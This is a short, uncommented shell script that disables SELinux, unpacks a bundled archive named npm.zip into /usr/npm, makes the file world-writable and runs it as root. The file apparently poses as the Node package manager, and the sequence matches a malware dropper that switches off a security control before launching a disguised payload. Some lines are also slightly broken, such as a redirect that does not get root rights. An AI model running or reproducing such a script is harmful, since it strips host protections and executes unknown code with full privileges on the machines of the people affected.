sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
unzip ./npm.zip
cp -r npm /usr/npm
rm npm.zip
rm npm
chmod 777 /usr/npm/npm
sudo sh /usr/npm/npm
